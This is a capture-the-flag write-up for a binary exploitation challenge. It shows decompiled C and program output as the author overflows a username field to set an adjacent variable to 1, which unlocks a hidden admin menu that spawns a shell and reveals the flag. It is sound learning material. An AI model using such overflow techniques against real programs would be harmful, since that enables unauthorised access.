This write up is for the variable pwn challenge

The first thing I do I look at is the type of file and I run checksec in order to find the protections on this binary

From this

I then opened it up in Ghidra.

```C
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined4 local_48;
  undefined1 local_44;
  undefined4 local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_48 = 0x72657375;
  local_44 = 0;
  local_18 = 0;
  do {
    local_14 = printMenu(&local_48,&local_18);
  } while (local_14 != 1);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
```
It looks like it just calls a print menu function, let's have a look at that. Ok that definitly how we are gonna be popping our shell. 

```C
    case 7:
      if (*param_2 != 1) goto switchD_001014cf_caseD_0;
      giveShell
```

It looks like if we can just call this case we can pop our shell, so our param_2 somehow needs to get set to 1. After looking through the other menu options it looks like we have a overflow in case 5.

```C
    case 5:
      puts("What would you like your new name to be?");
      getline(&local_48,local_40,stdin);
      iVar1 = __isoc99_sscanf(local_48,&DAT_001021a9,param_1);
      if (iVar1 != 1) {
        printf("Error reading in new name");
        *param_1 = 0x72657375;
        *(undefined1 *)(param_1 + 1) = 0;
      }
```

```C
printf("%d\n",(ulong)*param_2)
```

It also looks like the value of param_2 is displayed at the top whenever the program runs

```
1094795585
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, what kind of math will you do today?
1. Add two numbers
2. Subtract two numbers
3. Multiply two numbers
4. Divide two numbers
5. Change username
6. Exit
> 

```
 It seems that after entering a bunch of A's the value changed, but how is it being affected. I then kept putting less and less A'a untill I found where the over flow happens.

 ```
65
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, what kind of math will you do today?
1. Add two numbers
2. Subtract two numbers
3. Multiply two numbers
4. Divide two numbers
5. Change username
6. Exit
> 

```

Ok, so it looks like it is printing the representation of the A in decimal. I then created a script to send in that number of A's then \x01 to change the value to one and...

```
1
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x01, what kind of math will you do today?
1. Add two numbers
2. Subtract two numbers
3. Multiply two numbers
4. Divide two numbers
5. Change username
6. Exit
7. Go to the admin prompt

```

I was able to get that menu option! Now I can just hit 7 to print my flag

CWE{you_dont_always_need_eip_E7pyjtjK}
